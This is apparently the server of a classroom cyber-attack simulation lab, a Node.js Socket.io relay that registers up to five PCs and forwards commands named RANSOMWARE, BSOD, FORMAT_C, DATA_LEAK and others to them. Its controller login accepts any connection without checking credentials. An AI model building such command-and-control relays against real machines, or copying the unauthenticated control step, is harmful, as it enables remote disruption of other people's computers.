import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";

const app = express();
const server = createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const MAX_CLIENTS = 5;

const clients = new Map();

const allowedCommands = new Set([
  "RANSOMWARE",
  "BSOD",
  "GHOST_MOUSE",
  "FORMAT_C",
  "DATA_LEAK",
  "POPUP_SPAM",
  "WALLPAPER",
  "RESTORE"
]);

app.use(express.static("public"));

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    clients: clients.size
  });
});

function assignId() {
  for (let i = 1; i <= MAX_CLIENTS; i++) {
    const id = `PC${String(i).padStart(2, "0")}`;

    if (!clients.has(id)) {
      return id;
    }
  }

  return null;
}

io.on("connection", socket => {
  socket.on("register-agent", () => {
    if (socket.data.registered) return;

    const id = assignId();

    if (!id) {
      socket.emit("lab-full");
      socket.disconnect(true);
      return;
    }

    socket.data.registered = true;
    socket.data.clientId = id;

    clients.set(id, socket.id);

    socket.emit("assigned-id", {
      id
    });

    io.emit("client-list", [...clients.keys()]);
  });

  socket.on("controller-auth", () => {
    socket.data.controller = true;

    socket.emit("controller-authenticated", {
      clients: [...clients.keys()]
    });
  });

  socket.on("command", ({ target, command, payload }) => {
    if (!socket.data.controller) return;
    if (!allowedCommands.has(command)) return;

    const event = {
      command,
      payload: payload ?? null
    };

    if (target === "ALL") {
      for (const socketId of clients.values()) {
        io.to(socketId).emit("agent-command", event);
      }

      return;
    }

    const targetSocket = clients.get(target);

    if (!targetSocket) return;

    io.to(targetSocket).emit("agent-command", event);
  });

  socket.on("disconnect", () => {
    const id = socket.data.clientId;

    if (id) {
      clients.delete(id);
      io.emit("client-list", [...clients.keys()]);
    }
  });
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`RPL Cyber Server running on port ${PORT}`);
});